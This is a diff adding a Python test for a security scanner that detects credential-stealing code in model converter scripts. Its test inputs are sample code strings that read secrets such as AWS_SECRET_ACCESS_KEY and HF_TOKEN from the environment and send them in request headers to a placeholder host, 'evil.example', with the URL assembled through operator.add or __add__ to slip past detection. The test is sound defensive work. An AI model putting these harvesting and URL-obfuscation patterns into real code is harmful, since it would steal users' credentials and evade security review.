@@ -4586,6 +4586,46 @@ def test_a_descriptor_bound_to_a_name_is_still_that_method():
     assert scan_converter_source(preamble + 'requests.get(HUB, ' + token) == []
 
 
+def test_a_bytes_environment_read_and_a_called_plus_are_read():
+    """os.getenvb(b"AWS_SECRET_ACCESS_KEY") is the same read as os.getenv on
+    Unix, and exempting it left the collected set holding the hub token alone
+    while a hub GET carried both values.
+
+    operator.add("https", "://evil.example/c") and "https".__add__(...) build
+    the same string the operator does, and reading only the operator left
+    neither literal holding a URL.
+    """
+    module = _load(
+        "converter_scan_getenvb_probe", "unsloth_zoo/converter_scan.py",
+    )
+    scan_converter_source = module.scan_converter_source
+
+    # Attributed by name, not merely refused as a read this cannot place: a
+    # bytes key is a key, and the allowance turns on which names are read.
+    import ast as ast_module
+    assert module._env_reads(
+        ast_module.parse('import os\nx = os.getenvb(b"AWS_SECRET_ACCESS_KEY")\n')
+    ) == ({"AWS_SECRET_ACCESS_KEY"}, False)
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    both = 'headers = {"a": os.environ["HF_TOKEN"], "b": other})\n'
+    send = 'requests.get(url, headers = {"a": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'other = os.getenvb(b"AWS_SECRET_ACCESS_KEY")\n'
+        'requests.get(HUB, ' + both,
+        'import operator\n'
+        'url = operator.add("https", "://evil.example/c")\n' + send,
+        'url = "https".__add__("://evil.example/c")\n' + send,
+        'url = str.__add__("https", "://evil.example/c")\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # The hub token read the same way is the read this allowance is for.
+    assert scan_converter_source(
+        preamble + 'token = os.getenvb(b"HF_TOKEN")\n'
+        + 'requests.get(HUB, headers = {"a": token})\n'
+    ) == []
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
